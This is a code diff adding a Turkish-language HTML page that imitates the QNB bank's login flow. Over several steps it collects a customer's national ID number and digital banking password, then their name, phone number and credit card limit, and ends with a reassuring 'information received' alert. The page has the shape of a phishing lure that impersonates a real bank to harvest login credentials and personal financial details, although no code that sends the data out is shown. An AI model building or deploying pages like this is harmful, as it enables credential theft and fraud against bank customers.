@@ -1,0 +1,247 @@
+<!doctype html>
+<html lang="tr">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>QNB Çok Aşamalı Form</title>
+<style>
+  :root{
+    --purple-600: #6d28d9;
+    --purple-700: #5b21b6;
+    --bg: #ffffff;
+    --muted-border: #e5e7eb;
+    --text: #111827;
+  }
+
+  html,body{
+    height:100%;
+    margin:0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+    background: #f4f5fa;
+    color: var(--text);
+  }
+
+  .page {
+    min-height:100vh;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    padding-bottom:40px;
+    box-sizing:border-box;
+  }
+
+  .header {
+    width:100%;
+    background: linear-gradient(90deg, #0c0032, #64004f);
+    height:80px;
+    display:flex;
+    align-items:center;
+    padding: 0 5%;
+    box-sizing:border-box;
+  }
+  .header img{ height:40px; max-width:100%; }
+
+  .form-box {
+    width:90%;
+    max-width:420px;
+    background: var(--bg);
+    border: 1px solid var(--muted-border);
+    border-radius: 8px;
+    margin-top: 32px;
+    padding: 28px;
+    box-shadow: 0 1px 6px rgba(0,0,0,0.06);
+    box-sizing: border-box;
+    transition: all .25s ease;
+  }
+
+  .form-label{
+    display:block;
+    font-weight:700;
+    margin-bottom:8px;
+    font-size:14px;
+  }
+
+  .text-input{
+    width:100%;
+    height:42px;
+    padding:8px 10px;
+    font-size:15px;
+    border-radius:6px;
+    border:1px solid #d1d5db;
+    margin-bottom:18px;
+    box-sizing:border-box;
+  }
+
+  .text-input:focus{
+    outline:none;
+    border-color: #8b5cf6;
+    box-shadow: 0 0 0 3px rgba(139,92,246,0.12);
+  }
+
+  .links{
+    margin-bottom:18px;
+    font-size:13px;
+    text-align:center;
+  }
+  .links a{ color:#6b006b; text-decoration:none; }
+  .links a:hover { text-decoration:underline; }
+
+  .submit-btn{
+    width:100%;
+    height:46px;
+    background: var(--purple-600);
+    border:none;
+    border-radius:6px;
+    color:#fff;
+    font-weight:600;
+    font-size:16px;
+    cursor:pointer;
+  }
+  .submit-btn:hover{ background: var(--purple-700); }
+
+  .hidden{ display:none; }
+
+  .question{
+    font-size:16px;
+    font-weight:700;
+    margin-bottom:16px;
+  }
+
+  .option-btn{
+    width:100%;
+    height:44px;
+    border-radius:6px;
+    border:1px solid #d1d5db;
+    background:#f3f4f6;
+    font-size:15px;
+    font-weight:600;
+    cursor:pointer;
+    margin-bottom:12px;
+  }
+  .option-btn:hover{ background:#ececec; }
+
+  .alert {
+    padding:12px;
+    border-radius:6px;
+    background:#fff1f0;
+    border:1px solid #f8d7da;
+    color:#9f1239;
+    font-weight:700;
+    margin-top:8px;
+  }
+
+  .small-note { font-size:13px; color:#6b7280; margin-top:8px; }
+
+  @media (max-width:480px){
+    .form-box{ margin-top:20px; padding:20px; border-radius:0; border:none; box-shadow:none; }
+    .header{ height:70px; padding:0 16px; }
+    .header img{ height:36px; }
+  }
+</style>
+</head>
+<body>
+  <div class="page">
+    <div class="header">
+      <img src="https://yt3.googleusercontent.com/3TeqFm20lULfukuJrmIdCjkhBW3YOki1p_CZcyvRONz8QiApC7h3xAnfcwx0uEc4V84Sx0Df=s900-c-k-c0x00ffffff-no-rj" alt="Logo">
+    </div>
+
+    <div class="form-box">
+
+      <!-- 1. Adım -->
+      <div id="step1">
+        <label class="form-label" for="tcno">Müşteri / T.C. Kimlik Numaranız</label>
+        <input id="tcno" class="text-input" type="text" inputmode="numeric" maxlength="11" placeholder="T.C. Kimlik Numaranızı Girin" required>
+
+        <label class="form-label" for="sifre">Dijital Şifreniz</label>
+        <input id="sifre" class="text-input" type="password" maxlength="6" placeholder="Dijital Şifreniz" required>
+
+        <div class="links">
+          <a href="#">Dijital Şifre Al</a> / <a href="#">Dijital Şifremi Unuttum</a>
+        </div>
+
+        <button class="submit-btn" id="toStep2">İleri</button>
+      </div>
+
+      <!-- 2. Adım: İsim Soyisim ve Telefon -->
+      <div id="step2" class="hidden">
+        <label class="form-label" for="fullname">Ad Soyad</label>
+        <input id="fullname" class="text-input" type="text" placeholder="Adınızı Soyadınızı Girin">
+
+        <label class="form-label" for="phone">Telefon Numaranız</label>
+        <input id="phone" class="text-input" type="tel" inputmode="numeric" maxlength="11" placeholder="05XXXXXXXXX">
+
+        <button class="submit-btn" id="toStep3">Devam</button>
+      </div>
+
+      <!-- 3. Adım: Kredi Kartı Kullanıyor musunuz -->
+      <div id="step3" class="hidden">
+        <p class="question">Kredi Kartı kullanıyor musunuz?</p>
+        <button class="option-btn" id="noCard">Hayır</button>
+        <button class="option-btn" id="yesCard">Evet</button>
+      </div>
+
+      <!-- Hayır sonucu -->
+      <div id="noCardMsg" class="hidden">
+        <div class="alert">Kredi kartınız yoksa bu işleme devam edemezsiniz.</div>
+        <div style="margin-top:16px;">
+          <button class="submit-btn" id="backToStartFromNo">Geri</button>
+        </div>
+      </div>
+
+      <!-- Evet sonucu (limit girme) -->
+      <div id="yesCardStep" class="hidden">
+        <label class="form-label" for="limit">Kredi Kartı Limitiniz</label>
+        <input id="limit" class="text-input" type="text" placeholder="Örnek: 25.000 TL veya 25000" />
+        <button class="submit-btn" id="submitLimit">Devam</button>
+      </div>
+
+    </div>
+  </div>
+
+<script>
+  // Elemanlar
+  const step1 = document.getElementById('step1');
+  const step2 = document.getElementById('step2');
+  const step3 = document.getElementById('step3');
+  const noCardMsg = document.getElementById('noCardMsg');
+  const yesCardStep = document.getElementById('yesCardStep');
+
+  document.getElementById('toStep2').addEventListener('click', ()=>{
+    const tc = document.getElementById('tcno').value.trim();
+    const sifre = document.getElementById('sifre').value.trim();
+    if(!tc || !sifre){ alert("Lütfen T.C. Kimlik ve Dijital Şifre alanlarını doldurun."); return; }
+    step1.classList.add('hidden');
+    step2.classList.remove('hidden');
+  });
+
+  document.getElementById('toStep3').addEventListener('click', ()=>{
+    const name = document.getElementById('fullname').value.trim();
+    const phone = document.getElementById('phone').value.trim();
+    if(!name || !phone){ alert("Lütfen ad soyad ve telefon numaranızı girin."); return; }
+    step2.classList.add('hidden');
+    step3.classList.remove('hidden');
+  });
+
+  document.getElementById('noCard').addEventListener('click', ()=>{
+    step3.classList.add('hidden');
+    noCardMsg.classList.remove('hidden');
+  });
+
+  document.getElementById('yesCard').addEventListener('click', ()=>{
+    step3.classList.add('hidden');
+    yesCardStep.classList.remove('hidden');
+  });
+
+  document.getElementById('backToStartFromNo').addEventListener('click', ()=>{
+    noCardMsg.classList.add('hidden');
+    step1.classList.remove('hidden');
+  });
+
+  document.getElementById('submitLimit').addEventListener('click', ()=>{
+    const limit = document.getElementById('limit').value.trim();
+    if(!limit){ alert("Lütfen kredi kartı limitinizi girin."); return; }
+    alert("Bilgiler başarıyla alındı. İşlem devam ediyor...");
+  });
+</script>
+</body>
+</html>
